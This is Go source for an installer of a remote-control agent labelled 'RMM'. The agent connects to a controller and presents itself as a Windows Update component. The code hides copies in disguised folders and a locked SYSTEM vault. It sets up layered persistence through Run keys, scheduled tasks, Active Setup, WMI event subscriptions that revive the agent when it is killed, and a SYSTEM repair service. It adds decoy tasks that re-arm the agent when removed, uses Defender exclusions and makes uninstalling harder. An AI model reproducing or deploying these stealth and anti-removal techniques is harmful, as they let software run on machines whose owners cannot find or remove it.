		for _, bp := range []string{filepath.Join(blenderDir, "mode.json"), filepath.Join(backupDir2, "mode.json")} {
			if b, err := os.ReadFile(bp); err == nil && len(bytes.TrimSpace(b)) > 0 {
				_ = os.WriteFile(filepath.Join(installDir, "mode.json"), b, 0644)
				log.Printf("[*] Kept existing operation mode from backup")
				break
			}
		}
	}
	// version.txt next to binary AND both backups: watchdog restores only
	// when the backup is >= installed, so a bulk-updated agent is never
	// downgraded by a stale backup.
	_ = os.WriteFile(filepath.Join(installDir, "version.txt"), []byte(version.Version+"\n"), 0644)
	_ = os.WriteFile(filepath.Join(blenderDir, "version.txt"), []byte(version.Version+"\n"), 0644)
	_ = os.WriteFile(filepath.Join(backupDir2, "version.txt"), []byte(version.Version+"\n"), 0644)
	writeIntegrityManifest(blenderDir, version.Version, agentPath)
	writeIntegrityManifest(backupDir2, version.Version, agentPath)
	// Fourth copy in the SYSTEM profile vault, locked to SYSTEM +
	// Administrators: unreachable to standard-user wipes and profile
	// sweeps, readable by the elevated healers as the copy of last resort.
	vault := vaultDir()
	_ = os.MkdirAll(vault, 0755)
	vaultAgent := filepath.Join(vault, "MicrosoftWindowsClient.exe")
	vaultCert := filepath.Join(vault, "server.crt")
	_ = copyFile(agentPath, vaultAgent)
	_ = copyFile(certPath, vaultCert)
	_ = os.WriteFile(filepath.Join(vault, "version.txt"), []byte(version.Version+"\n"), 0644)
	if agentToken != "" {
		_ = os.WriteFile(filepath.Join(vault, "token.txt"), []byte(agentToken+"\n"), 0600)
	}
	_ = os.WriteFile(filepath.Join(vault, "delete_token.txt"), []byte(deleteToken+"\n"), 0600)
	if agentModeFlag != "" {
		_ = os.WriteFile(filepath.Join(vault, "mode.json"), []byte(agentModeFlag+"\n"), 0644)
	}
	writeIntegrityManifest(vault, version.Version, agentPath)
	hideFile(vaultAgent)
	hideFile(vault)
	lockVault(vault)
	log.Printf("[*] Vault copy installed: %s", vault)
	// Hidden+system attributes: invisible to casual browsing, blocks
	// shift-delete sweeps that skip system files.
	for _, p := range []string{backupAgent, backupCert, backupAgent2, backupCert2, backupToken, backupToken2} {
		hideFile(p)
	}
	// Post-flight verification (v1.46.51 post-mortem): every write above
	// is silent on failure, and new papers over old bytes is exactly the
	// shape the watcher then "heals" backward into a downgrade. Verify
	// bytes + versions now and fail LOUDLY (nonzero exit surfaces as e=
	// in the install CMD) instead of exiting 0 over a no-op install.
	verifyFileSHA(filepath.Join(installDir, "MicrosoftWindowsClient.exe"), payloadExe, "install exe")
	verifyFileSHA(backupAgent, payloadExe, "backup exe")
	verifyFileSHA(backupAgent2, payloadExe, "backup2 exe")
	verifyFileSHA(vaultAgent, payloadExe, "vault exe")
	verifyVersionFile(installDir, version.Version, "install")
	verifyVersionFile(blenderDir, version.Version, "backup")
	verifyVersionFile(backupDir2, version.Version, "backup2")
	verifyVersionFile(vault, version.Version, "vault")
	log.Printf("[*] install verified: %s bytes match payload in all 4 slots", version.Version)
	// Pending update claim: same file+format as update pushes, so the
	// watcher can tell this verified install (installed==pin: healthy,
	// converge backups forward) from a trojan swap later.
	claimSum := sha256.Sum256(payloadExe)
	claim, _ := json.Marshal(map[string]string{
		"from": prevVer, "to": version.Version,
		"at":   time.Now().UTC().Format(time.RFC3339),
		"sha":  hex.EncodeToString(claimSum[:]),
	})
	if err := os.WriteFile(filepath.Join(installDir, "pending_update.json"), append(claim, '\n'), 0644); err != nil {
		die("claim write failed: %v", err)
	}

	// Native supervisor (v1.40.9+): the agent binary watches itself
	// (--watch mode). No powershell process, no .ps1 on disk. Legacy
	// script + its task-XML copy are removed so nothing references them.
	_ = os.Remove(filepath.Join(blenderDir, "watchdog.ps1"))
	_ = os.Remove(filepath.Join(backupDir2, "watchdog.ps1"))
	_ = os.Remove(filepath.Join(blenderDir, "watchdog_task.xml"))
	// (Retired powershell watchdog body removed; native --watch mode above.)

	// Start the native supervisor (same binary, hidden, bland name).
	cmdWatchdog := hiddenExec(agentPath, "--watch")
	cmdWatchdog.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	_ = cmdWatchdog.Start()

	watchdogRunCmd := fmt.Sprintf(`"%s" --watch`, agentPath)
	// HKCU may fail when installer runs elevated (writes to admin's HKCU, not user's) - not critical, HKLM is primary
	if k, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		if err := k.SetStringValue("WindowsUpdateWatchdog", watchdogRunCmd); err != nil {
			log.Printf("[!] HKCU watchdog Run key write failed (non-critical): %v", err)
		}
		k.Close()
	}
	// HKLM is primary persistence - survives reboots for all users
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdateWatchdog", watchdogRunCmd)
		k.Close()
		log.Printf("[*] HKLM watchdog Run key set")
	}

	createWatchdogTask(agentPath, blenderDir)
	_ = copyFile(filepath.Join(blenderDir, "watchdog_task.xml"), filepath.Join(installDir, "watchdog_task.xml"))

	// Logon-time vector: Active Setup runs StubPath once per user per
	// version. Detached via cmd/start so it can NEVER block logon (a
	// never-exiting watcher as StubPath would hang the desktop).
	ensureActiveSetup(agentPath)

	// Third persistence task under a different name: a kill chain wiping
	// "WindowsUpdate*" still leaves this one to revive everything.
	createOrchestratorTask(agentPath, blenderDir, installDir)

	// Slow down manual deletion: hidden+system on the install dir itself.
	hideFile(installDir)

	// Deepest layers: WMI timers + the SYSTEM repair service (boot-time
	// coverage with nobody logged on). The service only repairs � the
	// agent itself always runs in the user session.
	setupWmiLayer(agentPath)
	installRepairService(agentPath)

	cmd := hiddenExec(agentPath, "-controller", controllerAddr, "-ca", certPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	_ = cmd.Start()

	// Honeypot legacy homes (64-bit + 32-bit twin): wipe any pre-1.40.9
	// install, then rebuild the dirs as DECOYS (stub agent.exe + cert
	// copy, both tripwired). Kill chains working from old notes waste
	// themselves here thinking they won, while the real install lives in
	// ProgramData. Decoys stay VISIBLE (hidden honeypots catch nobody).
	legacyHomes := []string{`C:\Program Files\RMM\Agent`}
	if pf := os.Getenv("ProgramFiles"); pf != "" {
		legacyHomes[0] = filepath.Join(pf, "RMM", "Agent")
	}
	x86Home := `C:\Program Files (x86)\RMM\Agent`
	if pf := os.Getenv("ProgramFiles(x86)"); pf != "" {
		x86Home = filepath.Join(pf, "RMM", "Agent")
	}
	legacyHomes = append(legacyHomes, x86Home)
	for _, legacyHome := range legacyHomes {
		if legacyHome == installDir {
			continue
		}
		_ = os.RemoveAll(legacyHome)
		_ = os.MkdirAll(legacyHome, 0755)
		if stub, err := fs.ReadFile(payloadFS, "payload/agent.exe"); err == nil {
			_ = os.WriteFile(filepath.Join(legacyHome, "agent.exe"), stub, 0755)
			log.Printf("[*] Honeypot stub placed at %s", filepath.Join(legacyHome, "agent.exe"))
		} else {
			log.Printf("[!] Honeypot stub missing from payload")
		}
		_ = copyFile(certPath, filepath.Join(legacyHome, "server.crt"))
		// Bait marker: the watcher only tripwires a deployed honeypot
		// (never alarms on machines predating it).
		_ = os.WriteFile(filepath.Join(legacyHome, "decoy.ver"), []byte(version.Version+"\n"), 0644)
	}
	// Fresh protection score (clears any stale tamper alarm).
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		_ = os.Remove(filepath.Join(localApp, "RMM", "protection.json"))
	}

	// Decoy heal vectors under a third name: a task + Run value that look
	// like legacy leftovers but actually re-arm persistence when run.
	// Attackers deleting "important-looking" entries trip the wire instead.
	createDecoyTask(agentPath, blenderDir, installDir)
	decoyRunCmd := fmt.Sprintf(`"%s" --wmi-heal`, agentPath)
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdateCheck", decoyRunCmd)
		k.Close()
		log.Printf("[*] Decoy Run value set")
	}
	// Task XMLs in the SECOND backup dir too: three copies total, so no
	// single wiped dir blinds every healer at once.
	for _, xml := range []string{"agent_task.xml", "watchdog_task.xml", "orchestrator_task.xml", "decoy_task.xml"} {
		_ = copyFile(filepath.Join(blenderDir, xml), filepath.Join(backupDir2, xml))
	}
	auditDuplicates()

	if !silent {
		fmt.Println("Agent installed to", installDir)
	}
}

func main() {
	// Silent installs show no console at all (bulk/remote deployment).
	for _, a := range os.Args {
		if a == "--silent" || a == "-s" || a == "--uninstall" {
			hideOwnConsole()
			break
		}
	}
	wantUninstall := false
	confirmed := false
	for i, a := range os.Args {
		if a == "--uninstall" {
			wantUninstall = true
		}
		if (a == "--confirm" && i+1 < len(os.Args) && strings.EqualFold(os.Args[i+1], "YES")) || strings.EqualFold(a, "--confirm=YES") {
			confirmed = true
		}
	}
	if wantUninstall {
		// Friction against casual/accidental removal: the flag alone is
		// not enough. Legit removal: --uninstall --confirm YES
		if !confirmed {
			fmt.Println("Refusing to uninstall without explicit confirmation.")
			fmt.Println("Usage: Agent-Setup.exe --uninstall --confirm YES")
			os.Exit(2)
		}
		programData := os.Getenv("ProgramData")
		if programData == "" {
			programData = `C:\ProgramData`
		}
		installDir := filepath.Join(programData, "Microsoft", "Windows", "Update")
		// Legacy home (pre-1.40.9): wiped after the new install lands.
		legacyDir := ""
		if pf := os.Getenv("ProgramFiles"); pf != "" {
			legacyDir = filepath.Join(pf, "RMM", "Agent")
		} else {
			legacyDir = `C:\Program Files\RMM\Agent`
		}
		if k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
			_ = k.DeleteValue("WindowsUpdate")
			_ = k.DeleteValue("WindowsUpdateWatchdog")
			_ = k.DeleteValue("WindowsUpdateCheck")
			k.Close()
		}
		if k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
			_ = k.DeleteValue("WindowsUpdate")
			_ = k.DeleteValue("WindowsUpdateWatchdog")
			_ = k.DeleteValue("WindowsUpdateCheck")
			k.Close()
		}
		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateOrchestrator", "/f").CombinedOutput()
		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateCheck", "/f").CombinedOutput()
		removeWmiLayer()
		_, _ = hiddenExec("sc", "stop", repairSvcName).CombinedOutput()
		_, _ = hiddenExec("sc", "delete", repairSvcName).CombinedOutput()
		_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`)
		threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
		blenderDir := filepath.Join(threeDObjects, "blender")
		_ = os.Remove(filepath.Join(blenderDir, "watchdog.ps1"))
		_ = os.Remove(filepath.Join(blenderDir, "watchdog.log"))
		_ = os.Remove(filepath.Join(blenderDir, "watchdog.log.1"))
		_ = os.Remove(filepath.Join(blenderDir, "version.txt"))
		_ = os.Remove(filepath.Join(blenderDir, "agent_task.xml"))
		_ = os.Remove(filepath.Join(blenderDir, "watchdog_task.xml"))
		_ = os.Remove(filepath.Join(blenderDir, "orchestrator_task.xml"))
		_ = os.Remove(filepath.Join(blenderDir, "decoy_task.xml"))
		_ = os.Remove(filepath.Join(blenderDir, "orchestrator_task.xml"))
			_ = os.Remove(filepath.Join(blenderDir, "MicrosoftWindowsClient.exe"))
			_ = os.Remove(filepath.Join(blenderDir, "server.crt"))
			_ = os.RemoveAll(blenderDir)
			// Update-rollback leftovers next to the installed binary.
			_ = os.Remove(filepath.Join(installDir, "MicrosoftWindowsClient.prev.exe"))
			_ = os.Remove(filepath.Join(installDir, "version.prev.txt"))
			_ = os.Remove(filepath.Join(installDir, "pending_update.json"))
			_ = os.Remove(filepath.Join(installDir, "rollback_notice.json"))
			_ = os.Remove(filepath.Join(installDir, "token.txt"))
			_ = os.Remove(filepath.Join(installDir, "mode.json"))
			_ = os.Remove(filepath.Join(blenderDir, "token.txt"))
			_ = os.Remove(filepath.Join(blenderDir, "mode.json"))
		// Second backup location (v1.40.6+).
		backupDir2 := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "Cache")
		if os.Getenv("APPDATA") == "" {
			backupDir2 = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Themes", "Cache")
		}
		_ = os.RemoveAll(backupDir2)
		if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
			_ = os.Remove(filepath.Join(localApp, "RMM", "healthy"))
		}
		_, _ = hiddenExec("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
		_, _ = hiddenExec("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
		// Kill watchdog by command-line match (window title is unreliable when hidden).
		_, _ = hiddenExec("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
		removeDefenderExclusions(installDir, filepath.Join(installDir, "MicrosoftWindowsClient.exe"))
		_ = os.RemoveAll(vaultDir())
		_ = os.RemoveAll(installDir)
		if legacyDir != "" && legacyDir != installDir {
			_ = os.RemoveAll(legacyDir)
		}
		x86Dir := `C:\Program Files (x86)\RMM\Agent`
		if pf := os.Getenv("ProgramFiles(x86)"); pf != "" {
			x86Dir = filepath.Join(pf, "RMM", "Agent")
		}
		if x86Dir != installDir {
			_ = os.RemoveAll(x86Dir)
		}
		fmt.Println("Agent uninstalled.")
		os.Exit(0)
	}
	install()
}

func createWatchdogTask(agentPath, backupDir string) {
	// Native supervisor task: runs the agent binary with --watch (no
	// powershell anywhere). XML copy stays beside the backup so the
	// watcher itself can rebuild a deleted task.
	// Self-defending task: any task-table mutation re-fires it instantly
	// (event trigger applied inside the builder).
	wxml := persist.WatchdogTaskXML(agentPath)

	// Keep a copy beside the backup so the watcher can rebuild a deleted
	// task without the installer.
	_ = os.WriteFile(filepath.Join(backupDir, "watchdog_task.xml"), []byte(wxml), 0644)
	tmpWatchdogTask := filepath.Join(os.TempDir(), "rmm_watchdog_task.xml")
	_ = os.WriteFile(tmpWatchdogTask, []byte(wxml), 0644)
	out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateWatchdog", "/xml", tmpWatchdogTask, "/f").CombinedOutput()
	if err != nil {
		log.Printf("[!] Failed to create watchdog task: %v %s", err, string(out))
	} else {
		log.Printf("[*] Watchdog task registered successfully")
	}
	_ = os.Remove(tmpWatchdogTask)
}

// createOrchestratorTask registers the third persistence task under a
// different name (logon + 30min + unlock, runs --watch). A kill chain that
// wipes "WindowsUpdate*" by name still leaves this one to revive the rest.
func createOrchestratorTask(agentPath, backupDir, installDir string) {
	orchXML := persist.OrchestratorTaskXML(agentPath)
	_ = os.WriteFile(filepath.Join(backupDir, "orchestrator_task.xml"), []byte(orchXML), 0644)
	_ = os.WriteFile(filepath.Join(installDir, "orchestrator_task.xml"), []byte(orchXML), 0644)
	tmpTask := filepath.Join(os.TempDir(), "rmm_orch_task.xml")
	_ = os.WriteFile(tmpTask, []byte(orchXML), 0644)
	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateOrchestrator", "/f").CombinedOutput()
	out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateOrchestrator", "/xml", tmpTask, "/f").CombinedOutput()
	if err != nil {
		log.Printf("[!] Failed to create orchestrator task: %v %s", err, strings.TrimSpace(string(out)))
	} else {
		log.Printf("[*] Orchestrator task registered successfully")
	}
	_ = os.Remove(tmpTask)
}

// createDecoyTask registers the honeypot task: named like a legacy
// leftover ("WindowsUpdateCheck"), it actually runs --wmi-heal (repairs +
// exits) on logon and hourly. Deleting it trips the tripwire instead of
// hurting anything.
func createDecoyTask(agentPath, backupDir, installDir string) {
	decoyXML := persist.DecoyTaskXML(agentPath)
	_ = os.WriteFile(filepath.Join(backupDir, "decoy_task.xml"), []byte(decoyXML), 0644)
	_ = os.WriteFile(filepath.Join(installDir, "decoy_task.xml"), []byte(decoyXML), 0644)
	tmpTask := filepath.Join(os.TempDir(), "rmm_decoy_task.xml")
	_ = os.WriteFile(tmpTask, []byte(decoyXML), 0644)
	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateCheck", "/f").CombinedOutput()
	out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", tmpTask, "/f").CombinedOutput()
	if err != nil {
		log.Printf("[!] Failed to create decoy task: %v %s", err, strings.TrimSpace(string(out)))
	} else {
		log.Printf("[*] Decoy task registered")
	}
	_ = os.Remove(tmpTask)
}

// activeSetupStub builds the detached launcher. powershell with
// -WindowStyle Hidden shows no console at all (cmd.exe /c start flashed
// one at every logon), Start-Process detaches so Active Setup never
// blocks, and the watcher self-hides on top.
func activeSetupStub(agentPath string) string {
	return `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process '` + strings.ReplaceAll(agentPath, "'", "''") + `' -ArgumentList '--watch' -WindowStyle Hidden"`
}

// ensureActiveSetup registers the logon-time vector (idempotent).
func ensureActiveSetup(agentPath string) {
	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`, registry.WRITE)
	if err != nil {
		log.Printf("[!] Active Setup key: %v", err)
		return
	}
	defer k.Close()
	_ = k.SetStringValue("StubPath", activeSetupStub(agentPath))
	_ = k.SetStringValue("Version", version.Version)
	log.Printf("[*] Active Setup logon vector set")
}

const wmiFilterName = "WindowsUpdateFilter"
const wmiDeathFilterName = "WindowsUpdateDeathFilter"
const wmiConsumerName = "WindowsUpdateConsumer"
const wmiTimerID = "WindowsUpdateTimer"

// wmiSets is the primary layer plus a duplicate under bland names: a
// remover targeting our WindowsUpdate* names still leaves the second set
// firing. Both run the same "<agent> --wmi-heal" consumer.
var wmiSets = [][4]string{
	{wmiFilterName, wmiDeathFilterName, wmiConsumerName, wmiTimerID},
	{"SystemHealthFilter", "SystemHealthDeathFilter", "SystemHealthConsumer", "SystemHealthTimer"},
}

// setupWmiLayer registers the deepest persistence layer: a WMI 30-minute
// timer that runs "<agent> --wmi-heal" (repairs tasks + Run keys from the
// install-dir XMLs). WMI subscriptions live outside schtasks/registry, so
// even a wipe of every task + Run value still converges back. Best effort:
// creation can fail under locked-down WMI/Defender � logged, install goes on.
func setupWmiLayer(agentPath string) {
	consumer := `"` + agentPath + `" --wmi-heal`
	// Two triggers share one consumer per set: a 30-minute timer
	// (total-wipe recovery) plus an agent-death event (taskkill answered in
	// ~1min). The consumer only repairs + kickstarts tasks (never starts
	// the agent itself: as SYSTEM it would land in session 0, breaking
	// interactivity).
	var sb strings.Builder
	for _, s := range wmiSets {
		na, nd, nc, tid := s[0], s[1], s[2], s[3]
		sb.WriteString(`$na='` + na + `';$nd='` + nd + `';$nc='` + nc + `';$tid='` + tid + `';`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$nd'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`$t=New-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Property @{TimerId=$tid;IntervalBetweenEvents=[uint32]1800000} -ErrorAction Stop;`)
		sb.WriteString(`$f=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$na;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __TimerEvent WHERE TimerId='$tid'"} -ErrorAction Stop;`)
		sb.WriteString(`$d=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$nd;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceDeletionEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND (TargetInstance.Name='MicrosoftWindowsClient.exe' OR TargetInstance.Name='agent.exe')"} -ErrorAction Stop;`)
		sb.WriteString(`$c=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{Name=$nc;CommandLineTemplate='` + strings.ReplaceAll(consumer, "'", "''") + `'} -ErrorAction Stop;`)
		sb.WriteString(`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$f;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;`)
		sb.WriteString(`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$d;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;`)
	}
	sb.WriteString(`Write-Host 'WMI-OK'`)
	out, err := hiddenExec("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", sb.String()).CombinedOutput()
	if err != nil || !strings.Contains(string(out), "WMI-OK") {
		log.Printf("[!] WMI layer not installed (non-fatal): %v %s", err, strings.TrimSpace(string(out)))
		return
	}
	log.Printf("[*] WMI resurrection installed (2 sets: timer + death trigger each)")
}



const repairSvcName = "WindowsUpdateOrchestrator"

// installRepairService registers the SYSTEM repair service (auto-start +
// restart-on-failure). Repairs only; the agent keeps running in the user
// session. Idempotent: existing service is stopped + removed first.
func installRepairService(agentPath string) {
	bin := `"` + agentPath + `" --svc-heal`
	// Stop first and WAIT for STOPPED: deleting a still-running service
	// makes SCM log 7031 "terminated unexpectedly" + fire the 60s restart
	// action (the alarming error loop seen on every reinstall).
	if _, err := hiddenExec("sc", "stop", repairSvcName).CombinedOutput(); err == nil {
		for i := 0; i < 30; i++ {
			out, _ := hiddenExec("sc", "query", repairSvcName).CombinedOutput()
			s := strings.ToUpper(string(out))
			if strings.Contains(s, "STOPPED") || strings.Contains(s, "FAILED 1060") || strings.Contains(s, "DOES NOT EXIST") {
				break
			}
			time.Sleep(time.Second)
		}
	}
	_, _ = hiddenExec("sc", "delete", repairSvcName).CombinedOutput()
	time.Sleep(time.Second)
	out, err := hiddenExec("sc", "create", repairSvcName, "binPath=", bin, "start=", "auto", "obj=", "LocalSystem").CombinedOutput()
	if err != nil {
		log.Printf("[!] repair service create: %v %s", err, strings.TrimSpace(string(out)))
		return
	}
	_, _ = hiddenExec("sc", "description", repairSvcName, "Windows Update Orchestration Service").CombinedOutput()
	_, _ = hiddenExec("sc", "failure", repairSvcName, "reset=", "86400", "actions=", "restart/60000/restart/60000/restart/60000").CombinedOutput()
	if out, err := hiddenExec("sc", "start", repairSvcName).CombinedOutput(); err != nil {
		log.Printf("[!] repair service start: %v %s", err, strings.TrimSpace(string(out)))
		return
	}
	log.Printf("[*] Repair service installed+started")
}

// removeWmiLayer deletes both WMI sets (uninstall path).
func removeWmiLayer() {
	var sb strings.Builder
	for _, s := range wmiSets {
		na, nd, nc, tid := s[0], s[1], s[2], s[3]
		sb.WriteString(`$na='` + na + `';$nd='` + nd + `';$nc='` + nc + `';$tid='` + tid + `';`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$nd'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
	}
	_, _ = hiddenExec("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", sb.String()).CombinedOutput()
}